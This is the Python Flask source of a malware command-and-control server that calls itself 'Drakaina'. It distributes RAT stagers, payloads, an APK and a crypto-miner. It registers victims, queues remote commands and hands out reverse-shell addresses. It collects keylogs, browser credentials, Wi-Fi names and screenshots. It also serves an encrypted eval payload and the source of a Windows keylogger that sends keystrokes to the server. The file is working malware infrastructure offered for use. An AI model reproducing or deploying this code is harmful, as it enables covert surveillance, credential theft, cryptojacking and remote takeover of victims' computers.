import platform
from flask import request, render_template
from flask import Flask , request, redirect, render_template , sessions, session, url_for, send_from_directory, send_file
from werkzeug.utils import secure_filename
from werkzeug.datastructures import  FileStorage
import os
import main_db
from datetime import date
import subprocess

app = Flask(__name__, static_folder='{0}/static'.format(os.getcwd()), template_folder='{0}/templates'.format(os.getcwd()))
app.config['SCREENSHOT_FOLDER'] = "./static/screenshots"
app.secret_key= os.urandom(24).hex()

### READ SERVER_CONFIG.CFG TO GET IP AND PORT ###
with open("./server.cfg", "r") as cfg:
    ip = '{0}'.format(cfg.readline()[7:].strip())
    port = '{0}'.format(cfg.readline()[5:].strip())

###  CREATE DIRECTORIES IF NOT ALREADY EXISTS ###
if os.path.isdir("./static/windows"):
    pass
else:
    os.mkdir("./static/windows")

if os.path.isdir("./static/linux"):
    pass
else:
    os.mkdir("./static/linux")

if os.path.isdir("./static/screenshots"):
    pass
else:
    os.mkdir("./static/screenshots")

if os.path.isdir("./static/macos"):
    pass
else:
    os.mkdir("./static/macos")

### CHECK IF NUITKA, REQUESTS, PSUTIL, pyautogui, PIL IS INSTALLED ###

if platform.uname()[0] == "Linux":
    proc = subprocess.Popen(["python3 -m nuitka"], stdout=subprocess.PIPE, shell=True)
    out = proc.communicate()
    if str(out) == "b''":
            print("Nuitka is not installed, attempting to install all required Module from pip")
            os.system("pip3 install nuitka")
            os.system("pip3 install requests")
            os.system("pip3 install psutil")
            os.system("pip3 install pyautogui")
            os.system("pip3 install PIL")
            os.system("pip3 install gzip")

            proc = subprocess.Popen(["python3 -m nuitka"], stdout=subprocess.PIPE, shell=True)
            out, err = proc.communicate()
            if str(out) == "b''":
                    print("Nuitka is still not installed, make sure python3 is installed on your system.")
            else:
                    print("Nuitka seems to be installed")
    else:
            print("Nuitka seems to be installed")

elif platform.uname()[0] == "Windows":
    print("function not completed yet")
        
### CHANGE STAGER.PY AND PAYLOAD.PY MASTER IP ###

linelist = []
linelist2 = []

with open("./stager.py", "r+") as stagerfile:
    for line in stagerfile.readlines():
        linelist.append(line)
with open("./stager.py", "w") as stagerfile:
    for line in linelist:
        if line == '_WEB_SERVER =\n':
            stagerfile.write('_WEB_SERVER = "{0}:{1}"\n'.format(ip, port))
        else:
            stagerfile.write(line)
    stagerfile.close()
    
with open("./payload.py", "r+") as stagerfile:
    for line in stagerfile.readlines():
        linelist2.append(line)
with open("./payload.py", "w") as stagerfile:
    for line in linelist2:
        if line == '_WEB_SERVER =\n':
            stagerfile.write('_WEB_SERVER = "{0}:{1}"\n'.format(ip, port))
        else:
            stagerfile.write(line)
    stagerfile.close()

print("""  _____            _         _               
 |  __ \          | |       (_)              
 | |  | |_ __ __ _| | ____ _ _ _ __   __ _   
 | |  | | '__/ _` | |/ / _` | | '_ \ / _` |  
 | |__| | | | (_| |   < (_| | | | | | (_| |  
 |_____/|_|  \__,_|_|\_\__,_|_|_| |_|\__,_|  
   _____ ______ _______      ________ _____  
  / ____|  ____|  __ \ \    / /  ____|  __ \ 
 | (___ | |__  | |__) \ \  / /| |__  | |__) |
  \___ \|  __| |  _  / \ \/ / |  __| |  _  / 
  ____) | |____| | \ \  \  /  | |____| | \ \ 
 |_____/|______|_|  \_\  \/   |______|_|  \_\
                                             
                                             """)
import time
time.sleep(3)

### needed for eval command from stager ###
_SERVER = "{0}:{1}".format(ip, port)

### UNFINISHED HTML GUI C&C ###
@app.route('/admin')
def mainn():
    rats = []
    for rat in main_db.get_rat_list():
        print(rat)
        rats.append(rat)
    return render_template("admin.html".format(os.getcwd()), rats=rats)

### LINUX WATHCDOG DOWNLOAD ###
@app.route('/downloads/linux/stager')
def download_linux_stager():
    print(request.user_agent.string)
    return send_file('./static/linux/stager', as_attachment=True)

### LINUX PAYLOAD DOWNLOAD ###
@app.route('/downloads/linux/payload')
def download_linux_payload():
    print(request.user_agent.string)
    return send_file('./static/linux/payload', as_attachment=True)

### ANDROID PAYLOAD DOWNLOAD ###
@app.route('/android')
def download_linzzux_payload():
    print(request.user_agent.string)
    return send_file("./static/linux/zz.apk", as_attachment=True)

### WINDOWS STAGER DOWNLOAD ###
@app.route('/downloads/windows/stager')
def download_windows_stager():
    print(request.user_agent.string)
    return send_file('./static/windows/stager.exe', as_attachment=True)

### WINDOWS PAYLOAD DOWNLOAD ###
@app.route('/downloads/windows/payload')
def download_windows_payload():
    print(request.user_agent.string)
    return send_file('./static/windows/payload.exe', as_attachment=True)

### DOWNLOAD MINERS ###
@app.route('/downloads/linux/phoenixminer')
def download_linux_phoenixminer():
    print(request.user_agent.string)
    return send_file('./static/linux/PhoenixMiner_5.7b_Linux.zip', as_attachment=True)

### REGISTER LINK, PARAMS IP, USER, OS ###
@app.route('/register/<ip>/<user>/<os>/<uuid>', methods=['POST', 'GET'])
def register(ip, user, os, uuid):
    if ip == "None":
        return "None"
    else:
        print(ip + ' ' + user + ' ' + os + ' ' + uuid)
        today = date.today()
        _REGISTERED_DATE = today.strftime("%m/%d/%y")
        _LAST_SEEN_DATE = today.strftime("%m/%d/%y")
        main_db.register(ip, user, os, _REGISTERED_DATE, _LAST_SEEN_DATE, uuid)
        #main_db.create_user_credentials(uuid.replace('-', ''))
        main_db.create_user_keylog_table(uuid)
        main_db.create_user_wifilisttable(uuid)
        main_db.create_user_info_table(uuid)
        main_db.create_user_settings_table(uuid)
        main_db.insert_user_settings(uuid)
        print('created users')
        return 'none'

### CHECK IF REGISTERED, PARAMS IP, USERNAME ###
@app.route('/check_if_registered/<ip>/<user>/<uuid>', methods=['POST', 'GET'])
def check_if_registered(ip, user, uuid):
    print('checking if user is registered alrdy')
    try:
        if ip == "None":
            return 0
        if main_db.check_rat_exists(ip, user, uuid) != None:
            print('he exists')
            print(request.remote_addr)
            print('true')
            return 'True'
        else:
            print('fffrue')
            return 'False'

    except TypeError:
        return redirect(register(ip, user, uuid))
    
### CHECK clients settings ###
@app.route('/settings/<uuid>', methods=['POST', 'GET'])
def check_settings(uuid):
    print('getting client settings')
    try:
        print(main_db.check_client_settings(uuid))
        settings = "{0}".format(main_db.check_client_settings(uuid))
        
        return settings

    except Exception as e:
        print(e)
        return "None"

### CHECK FOR COMMAND LINK ###
@app.route('/command/<ip>/<user>/<uuid>', methods=['POST', 'GET'])
def command(ip, user,  uuid):
    today = date.today()
    command = '{0}'.format(main_db.get_user_command(ip, user, uuid))
    main_db.remove_user_command(ip, user,  uuid)
    main_db.update_user_lastseendate(ip, user, uuid, today.strftime("%m/%d/%y"))
    print(command)
    return command

### INSERT KEYLOGS INTO DATABASE ###
@app.route('/keylogger/<ip>/<user>/<uuid>/<log>', methods=['POST', 'GET'])
def keylogger(ip, user,  uuid, log):
    print(log)
    main_db.insert_user_keylog(uuid, log)
    
    return "None"

### CHECK FOR A MASS COMMAND LINK ###
@app.route('/mass/<ip>/<user>', methods=['POST', 'GET'])
def mass_(ip, user): 
    command = '{0}'.format(main_db.get_user_command(ip, user))
    main_db.remove_user_command(ip, user)
    print(command)
    return command

### COMMAND LINKS ###

@app.route('/wifi_name/<uuid>/<wifi_name>', methods=['POST', 'GET'])
def insert_wifi_name(uuid, wifi_name):
    main_db.insert_user_wifi(uuid, wifi_name)
    print('created ')

@app.route('/browser_creds/<uuid>/<site_name>/<username>/<password>', methods=['POST', 'GET'])
def insert_browser_creds(uuid, site_name, username, password):
    main_db.insert_user_credentials(uuid, site_name, username, password)

    print(site_name)
    print(username)
    print(password)

    return 'nothing'
    

### REVERSE SHELL, CHECK FOR A SERVER ###
@app.route('/rshell/<ip>/<user>/<uuid>', methods=['POST', 'GET'])
def rshell_(ip, user,  uuid): 
    master_ip = '{0}'.format(main_db.get_rshell_master(ip, user,  uuid))
    master_port = '{0}'.format(main_db.get_rshell_master_port(ip, user,  uuid))
    return master_ip + " " + master_port

### GET YOUR IP ###
@app.route('/getip', methods=['POST', 'GET'])
def get_ip(): 
    return str(request.remote_addr)

#################################################
def check_token(key):
    print(key)
    f = open('tokens', 'r')
    token_list = []
    for token in f.readlines():
        token_list.append(token[:-1])
        f.close()
    print(token_list)
    if key in token_list:
        print('yup')
        return 1
    else:
        return 0

### once the link is clicked the link will no longer be avail ###
@app.route('/inf/<key>', methods=['GET']) 
def information_grabber(key):
    if check_token(key) == 1:
        ### remove token code here ####
        f = open('tokens', 'r')
        token_list = []
        for token in f.readlines():
            token_list.append(token[:-1])
            f.close()
        for token in token_list:
            if token == key:
                token_list.remove(token)
        os.remove("./tokens")
        f = open('tokens', 'a')
        for token in token_list:
            f.write('{0}\n'.format(token))
        f.close()
        print(token_list)
        print(request.headers)
        print(request.headers['User-Agent'])
        
        ### infor grabber code here ###
        return 'something'
    else:
        return 'nothing'
################################################################


### USER UPLOAD SCREENSHOT LINK ###
@app.route('/upload/screenshot/<ip>/<user>/<uuid>', methods=['POST', 'GET'])
def upload_screenshot(ip, user, uuid): 
    if request.method == 'POST':
        try:
            if main_db.check_rat_exists(ip, user, uuid) != None:
                print("screenshot user exists")
                f = request.files['file']
                filename = secure_filename(f.filename)
                f.save(os.path.join(app.config['SCREENSHOT_FOLDER'], filename))
                return 'ok'
            else:
                print("no user zzzzzzzzzzzzzzz")
                return None
        except Exception as e:
            print(e)
    if request.method == 'GET':

        return """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>iMakeYouWear</title>
<meta name="description" content="">
<meta name="author" content="">

<body>
    <form name="upload" action = "http://{0}/upload/screenshot/{1}/{2}/{3}" method = "POST" 
       enctype = "multipart/form-data">
       <input type = "file" name = "file" />
       <input type = "submit"/>
    </form>   
 </body>
</html>
""".format("{0}:{1}", "{0}",ip, port, user, uuid )

###  GET IFRAME OF FILE SYSTEM ###
@app.route('/iframe', methods=['GET'])
def get_iframe():
    return """<!DOCTYPE html>
<html>
<body>

<script>
navigator.geolocation.getCurrentPosition((loc) => {
  console.log('The location in lat lon format is: [', loc.coords.latitude, ',', loc.coords.longitude, ']');
})
</script>

</body>
</html>

"""
### Eval Payloads ###

### Main Payload ###'

@app.route('/remote', methods=['GET'])

def remote():
    return b'gAAAAABnVchUE3tBS7VYKegAUlaOtCE4aVyCuxEwnPvKKgmOkSiuOjDM7SPmMt5RPCwsOH9wq6as_a0QIjStDCZDAGX4HZSwdyKxhGce0Mhd1KLPKX401QvG9G3-eDLc1v-bFkLEXfG7ABXVOfVPo7aL7b7Doj8xRxTQOkkLGqR4EEpA5uhHbeMk4x2crGTJ1FYW3HYf1SsfnHoZQLOkcx7TniVR6yTKZaas1OhkK2GJhI2iXpki9HJJnID67BAMSmC9S-d9eiUhztMKgC904iQXGc-sGgzDmub1hnbZOo3I7Zm1QeCBpr8jSrf-6MTV2Jw_n1N02mmlx1ZhvdqWf3T13PJDh6I9u706KuM2ou1nU8DK3bJ2vMOJx1kcPYyn92yh8C-1E6xCO06a8XDp9M_2I9jAMDnUxj4CxkUSp99YxrSeEupAZOFhNhLIUvnzncbNK5VlerXQdUiEJbx32ILGK89c-kMEtTntjOFOHzkCzUUUhEUDYLaPSi4e23hyxP91TRrzpcbMl8XEwJvke5ENiFM-i0tCJejhaVyxzV_uWc2myqe6Z9DWjWvsh5AauiZUfMRHJ2FpY46KEa6QFmy-s7o0J5Ao51ZGjubn9pZ30jdL89bjMkmhxe6cuqL70g0NQ2F5gfInraHkmW9eSDFvCfW6tJqmELMUqVpMU0RyPPxbflLJBeolGss2sO-En4UCnprJQk8w3IPHkNFJrm7DM3FaVt839ve3F6IDE0qas0ylp-_Yco2hfdhrQhD1zIfNAjGYC7ql70WJckZb4xSo-NFK9DGFhoKikpNT9Nps0EqGB4QiV5J3yqe-xudLXR2Bdh5zj_Aw2NXAHTEO78lzANP8Z60vSAUjU9F3p3X6jxjSc9XDNhBH9R79O9i6LfirH34OSN-XOae30KmMAu6vp1cUCl1I46QrhVg-sLfaSjpw0dpQdZqlg5bw_zB247EOxV9PJ-gv48Ur93OeZvX_1K8ohtf7QSwTAspu-W5EUdvHTO3z2LLGkZj7F5EtKOhxl81RSzOCnGy0p6yn8BpMW2NhcUbAFKvB-g66E0J39sjsnCVsjYDU5Ok7LceyC2wBSMgIDYbYhhA8TYbfaweNu8HcP6g4gVozkGFQbuCp7LjQJOCB8BWvP-8-nzpJiofwNtlChxegL0gGHrVt0DPuIOxYUHbBI4-HNW2DxBibA1mj2787RNnLPJmlor3rpw9B0XHgGOpM2yltuWxJzkJgupSAO20qUntST5CoiLdKsasjLydAykIwLzaULoEEJVlDW03RYig-CnROx4_Rz_-0zfon3w2BDrKfNYgGRACzMtuQfcsidwR5B2lVEjLy6bcjtrTd0XOLIjPx3QXLLsLaTijhu3r845MYgOiNjhMaKMIcIiR__N6lQUW55jWeM7Y-4IvLkJZOfD0Pk4Y5kkcz6Anc7KknUoGBfXaIgXDKVAGkG6EQuIKAK5wudmEIdXhAGMTLR_8B1nDuYtjR9sinbzCPGKbRMrw3cB5FreWzrwyw3wn1hLWZHAQ02Aiv9_8F3w8OQD1NmhoHoTnsEFo-czWVcxOwFqpYvaVsHqkwhcyuXUht75gKcux9-KXNBVPB_YeB9DD99dr-FIfld1_-_ZQYByhx1XKbajM-CexQ5tcJ4kKoEiHW0UrrRtNtDZE2wnBCvFLLEOajVzX-dqD3Vrhv3Jz6LwHyr-P22iOh-vg5AwBkBCYsyix4580vodiVUDBMTW8ygdy1sC5XE8VQnUiw8HEcp1AgWRpzrFbKq4CBRiTpvoW0lBEgqZc9exVtRDX9-zB2U-3ES9SKIHe7A6N2xOukM13tQwASE8p6RYyv_v5bcvOP_MliQeJIcrmQDRlXKQTRpY0N4tcfIUWH_iVkqu3MLDJEbRMNdrGJ7wwRLV4hRbbW6GY20oTFZ2SBAh5sUFgnSGW4XCc1E7gxwXmXoNysApntXKNDp3Mv61auC-WyIF-X2l39FkT3hm-2cJN37ZMFlJt99ZuiEpcqzppMj7RE_jddgR-7Ri9VLpkPjHfjHAoDTKX9L7b8cWyAPsVkO859wBIyyA_uLwPvnqf7-EnTQKDtsU6nJjKYkAowxZIcjrBVJ0sLJU-z6sABT4VdNyQZhSGAZFprEZZz9qvvPdnYBxPb3zs8hmPc7V8VmhlqmaJ2eUNaPhiWJi5u2C31m8WOdoaZNpcZ1wa3swJ8x54-exgoaAAGMj4TJEzQwMwSAH6c5dEMg4BHE2tGjWJRILeg92pnd85mVnR8jZe_vAMBX1U7-XdaxtPpaHRRUSGVo5EvqYALwo0UH7OFbt15V5YdvTYQhCNSrm-AyTE-o8HqJQdUjA1lfxLMYIKB5HqsWwnFRF_0reShucStbtBOk7OdETWAIrvZ2pDQrxweqvbo9wH8WSTR6OLIR0pOFuAn9YXFKBGMc_fATkLEU-WLv6quCD5tPE1--D2FlB_M7APcj2j_9r9YnKF3gRAtDdkM_K-t0LXFOOC_tAlrUSBv3Aj8wSXvPtvwyotf1HXFGXicjd9HGlVub5yIGMW3ccUSiiU89koPjF65QiGeW70aqcu08PQ93PeVwnj_UoXYL7lWxCD9B8BbqADGAh5DBeSapThbl0DzYLssOl8ZS2062QxCh7Moc_WbfSZOp_pCrle0sZ0aVq0V0HLYOgBjwijP5NtNPCBE2EjY_X6GrjqLDu2IsXviwA3jUhkjQ3RFTvTP_GxQVM8aKJCaUPH5BSytCufpZgfpKE8N3NctMVAp_5Tl8hUI7k9NXzurTQVGbaiAPRZwqm3UX_2Y-i1ajSHwqDMGMbjcibybhnbxfUAUUcI5oAJ1y5iujPWZegduD75Vpc-6zpVJ-Irmoe0P7RxB3-BfRhTYfJg7LrE14xjrmH7RST57TaX_B5lYmKR9Gt2xFAvzUkoL2yC9rbzBxu0PpeR3vRDGXj9TL_n1cwrOo_5Bfu-icLP9tvr7gFx2WTdqSVqTjPqd42JPld3ox4zlfsmjtrWXbbINYhpsyVJO9n2gFq6wjvS9G09tdwf7qi7pJWyWz43HF6EXhB4U7IZcicsVmr4vHNjK8VCLjvgWDz0mQmVLgIHwOgTlYAMA-V3Z6492D4QJsVUsyXRpW69PLf9MaY4CDCsCxmO2jK7RfCR2oNTu5-YeplQ46HMyclbzqB5QmmhhurW_ctmuwlBmZOsMIuO2mKYfa9N40NPoCINu1z_aU-HELdMebyWhyHx1UHs1fJTYBqRP03uIcq0EUdVhfffmrDVTZsGUdzmDnUOgr7KBgQGM_v-L86hZvE2woVzw6XsqX1WNdvAcWrNZjMuPb0-W57p2ScjYiSct14HwmRLGfdD4yiTUZQUt-LaYVB5MspCEWIh9Q6IBkxx6eFjsXbpm3Qe8qX6DECbZInD1N8cJxBXN9bTHFP8_Ei81Bcwea_7PsmWvVZtik7s0bTkXDECX9fkmKaXbaKG2CF0msTlMFDZ3bmqTsfOXSkY3Xott58E8aOxWnB1vvs-Wtgt8XuuT4W_0Mqa9kWrEjclTaCTavVAWJDiOuA1uqqviTbvr3RAL_3Icpyq8nYCf2olrnFpM409geF0KiPLTH50iAzQDGWAmq1TeJv9Fco0j7LEWU_9FpuZDeuSwhd503-opQ36rDk0KR-MYgdqALjVisggFCaGkl__qAYlYJ5gxSF6bd41P9z39HqFSWdi4hpVbUTZjMNtxbNVYUc9hYUESwHTkU7ObTusldu6dHsl27ctOyRcEXKQNl5s08SjrIavDFkNmkoAOuq2geO7sARlVvaYFya2g7r_pEqR7IB5g30F81_u-m7DMz_Q9IX8Qo1daoq9lCjMzgnTezxcP8kBLbY2RDsHMoi2H2VLVOZt9oofEKAn6BNUtag6wpAcfZZjZBA1W66RLFVL8LHMNxbhu6phUT6U1L74J7iUckjPczHeYovSgdv9qNcQksjgesF6ApB9fUAKC5ZJUy1t1kp5aAcraiEMbjZ993Vd0DGp26V54eHOCkY4yf4fLOkQ3X0Ic6ZUB2Zki_NFamnzYVpEahcvhGn3XxO7ZQrqflsZb91URDQcVNnSRP2eVUJcofFysdpyW_TimbWdcBN7y8CkjOe4qKdqL1IwE4eU-OR89yEtm6uSSTuG47T9N7AeEU3B3H8qBYEE7jiT-pfCeaXMTCEiZ61fFv7u9gjRH_EwtYCE0EeikIxZvWE4-SZqqYzDpe6G825HG8BcWVv2zuMdLwgbav-n24d9l7F_HdUROcRcCoyPm3YLLe45FhslXeDTR_znuVc97Ua_5KWh_LbIfEIUpkv_wJ-ynYdO7tczqNxXtOsRFknY6WV8fqcOHRXJVZ7yMbY9nUHUkI6JWWCb-Fy2kIwwV1kFFZMqwFt2cXq2FdicFNX5Re8OUzvgSBSittjJTkoOVTsf8ldwlcTs2Onc_DXt0nb0qWgsHNd6WB8ORBlgIkXU0Y3WLD0dNJ4w5Z2nj-F-V6uEEKldUsnJAr-_NENFfcLVvjnzYU4iBULQ4WqLJwF_8AbezBsMFDM114cjbTlVV7ABu90i1xA_Ewna-l07bUn-0NdI5_V-isbVwbb0T9guAvean1IKWqxeO3MJFJ0jA9ElhoDXWxzKxeGHrP-0nx6cpqsReF6edbvtJ9C9yevlfuCtVZSczhFLodKT6QOmBYIYsZo26F9lLQBQqd9X3kxiRwxc4PNz-MRX-W5UBMQHU_ZGNwd-wpi84rxL0GOoknjwaennuIFnu1su5ZR62V0SHVoyfr6El0_-oiNEkON087OzhCLNmSm2nAtiZqzm-8pxd1EdW5OZ74kayKPqlsJQl7luXuMC-yQpxR_yB3r_dkjd0TBlDNzhz2aJxxOiHkOtMvMrt7DR4IYxJ_hp4I161qtLJKXTA96VMR6USswey8xfQpD3BgSwvHhAiv0V0sHccQcGuS4YHDoCZzDhRm01OIiMdf3eNwlhx85vn2Yf0XklscBSXRS79c0tN0rswFYQIzk-qPd-swt5dL6a1XDz7LWrag56E7K1X33WJxOF24NTHw6M__kEcL81F6hlcuoWA8qA1iHktKagBwyh_XV8UXHdNaYkmt1HzX4FuVUxt5qHCg2m5B7DBL7W5bwcUbiBSadabI4XPoEnKFD--ncErJjrS5qZGAi4MP2-Cf77y5wH628cS6ZNhl_eMRdX-BuXNLdbWRxhpfM2Ve4xIH5hTD_VOgJlMs7s9lg_wkQz-qFYhN5xUWY_TylMzZYaGmxEhqLzl4onk0W1Xv59abhjo52m2O58Wq8oXPr1lDbGzgfTd8Hw9XN0k6VmwOeIWvKndDJWbMckgfGFrQkZw3NwuTvqwpGX001FgFJdmKVKN7jNvopkiciVfsbqdgg_75swpdhgY09-pHLU1qlJjkOQLmopTFzaC-6GnrZBB2wG9yA-P3bCRf2A3axxVcojbuDu6eCrZJTF7cQZfmwIXCPHaOG865b5JthJuGlV7ZeLY9lDBIsS9rjkXxG5wjZhaDXVSIIYZgSnZgM6bAkktbdzAimf2S7NE6EgZuxe1FO-VcjpISISw2YeqCnmSG1zDN6EETU9yx8CaR1L89bDSsCvUE1MzO666FZxhyjsVk1MHb2WTFCCJp1hmeKMx3K0ZY8dvjFT4c81TvVE4VRF8WGgHCAp_o2tqkU0Gl5WU7egxeMUOCX9ZJm-GleZpR1rEd7zwWBVqIeFezzoThI01Xw8ymddwJn5DGW7s72os5iDQ4juJEK9u4gu9tPolWUpcl3azCed6yE3InxKhdrLMHNXuIsV8W2X-stQVSNq4G-YbXkqHtV5goovGnrNCptEoMLeTee-PgSXhYLZk5MP4lPqrIX2PqjgwHeVoX3c5R2v70-1uY6TQWBLruWEJbTikS-RRgnfTp5yECaPpQ-fahO8J8Knq8_Ic5UqPq3HC0Vm9Dmjrl2US56eyGFmoaUdWJ-lTb4EDfS20cUSUaENHABiqDp_7lj9wgYZsjOv79D5Iy-ym0r--DgCULxqYgH8PyM14MQvsTzXQ22H1LFYz8GP3dsZhZS54Ssh3khZREArC7JSkZkSBh7HkGuQJkf5Dp-PBXqGRYjTBtbGUfX1aTL_HXFTotzxuPiGXaDtS_vX_hRhCJvg6b__bfWDRsZRCoi5Q4FvxbdQ0WQhd2-EG69LWkB-8IiDgcc22UwMVo-Dy__cUSlWDQOOGUBwlaRtki4onzpWA5CGcDNTieUOj_Z7uvFKv7mjWPHHKgv8sfqyr3N4eKXRsW-lHopIOQrt86J8JjwzY0u7qmg1GQfb3j3zmy605y9qZ450IMbqxxhJ0r10Y3AACIQP_UsyvQIJg9TGbwyXf79zpHYzbe1OgP8tliOsNwtCpNT2w573eoy6WwxCoeOoswTDlCoQwbj3qOSA7GMNMCdLUgNJ428XL81RP1SXcQuIBCATgQTN07JVOMMeBxCgKb1_liVliS3bzeixQYGOT97W2DoxnIIaqQfVice08ibY6Ti4GMMROAlykOs3dtjw35UUv-l_NsKYQLEuJhYE0fP9RDRZDH43lcj6z0e8qqxm6vGfRU6Qw0xOJk9m-F6gGTNsGhIPwkbfwWM9F2x44KYnJ5sokj-wsNKiZPowc5XfgN7eka3BkA34zsi_2rEQZ7d8H5owt4ClVDzvGE_5Vs_vaTQebv9-hgnMFM8MRlF-jYR6cl6EIL_0HGfbMa_FpiCLa2Mibxc4sk-M-qbKGgGvBifYzJQB-_vNqq4r9rkd-B3cUZxanJkiPoEvrdWj4bm9cQ8-YJwpLIvqMPL5t3qs0yeUlucVlZPKjOIshgpVGmrvVmdWCAdcKRRzw6ZbdV_-dVTpyfP_CTHp1jbLHwQLqA4SaRKlsve2poSr7_vQlt1d9VQ8ti2iG879DyQitz8sHt9FHVBHPNgf5Gppaa_6kjDYmUr_h9rWu3ZRi_7lR5lGxdc2tGSaBEQ9mxKn8gnL3WI-dCqafcbSRGOT_pqpBFUV16h3q8kFWuS0GWRY2Y3GP2MqWAyYgYgrph4oiZpx9vTaF2CPKF0sYr-on1VL2lzJ7jFcYYKaCQr_nXYgNPAVR2fMUKLXnFZsV7wNnEFcapL0ZlgMBTkxCvofpjAB7WZhBPetjebWXYZVPJaGRS8oq-xS48K_qy7LissHeTXiVFCnbd3toEc1F5nB0axuQsLkLjitw-IA9q8yPSYNGvAvlcdKREECijuHzl1V0dUQHFyxV9y2a5DhBKfBWFTSukiXLDWxQv_6BuD89H_rU2vi3fnqSc7A4MrCSmFHfXtgsJtpdlUth1TRgyobA2sXlA7EWzbSM-UBEwFpDTQQMlA-n0DspMSITNRrfFtle0QIhgf2ESJllUEGsWaL9SssE4MjJoNvWw8TE61Fbp6nHqgb7XRvyIocPNXz107cJRhB6QG3SVctiUJzqikoykkP3z3Y915evb-b7_wvoD3i0G_yfQt-axPnn1hCoWbYZTUTSREiRaULVGGLGvkj8mdSJaQm7fS1pMuJHrfys36UNR398fLV2PWdTI4gCDdYUfSYHTNwoDAQoj-f90dotHuZfkjXqHLVua3NIol9Dozu9LLhvpjjAWkiGW_7wFixrHYCkpttLp61BZcNT4PzY-Djl4MyyD8VlKL-cPmnSG57CuadTlT8ZQlnFt8FurPhx-tt-6bJh6SHUk1rMapkod6iBG_iCRKHMlWhJWw3hPfd0Zn_zfghmNR-w_YLnQRNAgBf6Y09YmFClvqCwxYr7XxCYYPMS2eVctY3I6PmNUsetHsatBc-QnqJ2-DVpiV75P3PQ4u0r5SWOWqXjc_6aDq-eZHomtj_CXBa90Kb6Aos5oZmhM21T3z7NJcekNf5dAsgg5xcCjiMT886tg2CfL2ftAOaRy_dgqP2W16ekppKuzA3lkXau3AqUW-hf6WNohSzUDgkI0emC7tG6oVhbif12jf0jTpPse7eyYXgBIAnb2Di3a1esLCEY6Hqx5gVQ0nFcboEcFKw_-k3QOY5_GnXl_HmetR5rxGkq9k_dSg2e3XpgRQRDtoc3zhdRiijFiaLUUyN3WE4LmxecRWiXHMkIluK6aavmkEato4n3Mx70_Q=='

### Keylogger Payload ###

@app.route('/keylog_payload', methods=['GET'])

def keylog_payload():
    return """

def start_keylogger():
        GetAsyncKeyState = cdll.user32.GetAsyncKeyState

        special_keys = {0x08: "BS", 0x09: "Tab", 0x0d: "Enter", 0x10: "Shift", 0x11: "Ctrl", 0x12: "Alt", 0x14: "CapsLock", 0x1b: "Esc", 0x20: "Space", 0x2e: "Del"}
        log = []
        logstring = ""

        # reset key states
        for i in range(256):
            GetAsyncKeyState(i)

        while True:
            if len(log) >= 25:
                print("fine wine")
                # UPLOAD LOG HERE #
                for character in log:
                    logstring = logstring + character
                print(logstring)
                requests.get('http://{0}/keylogger/{1}/{2}/{3}/{4}'.format(_WEB_SERVER, _MY_IP, getpass.getuser(), current_machine_id, logstring))
                logstring = ""
                    
                log = []
            for i in range(256):
                if GetAsyncKeyState(i) & 1:
                    if i in special_keys:
                        print("<%s>" % special_keys[i],)
                    elif 0x30 <= i <= 0x5a:
                        ### characters a-z/0-9 ###
                        print ("%c" % i,)
                        print('cool')
                        log.append("%c" % i,)
                        print(log)

                    else:
                        print("[%02x]" % i,)
            sys.stdout.flush()

    
"""

app.run(host=ip, port=port, threaded=True, debug=True)
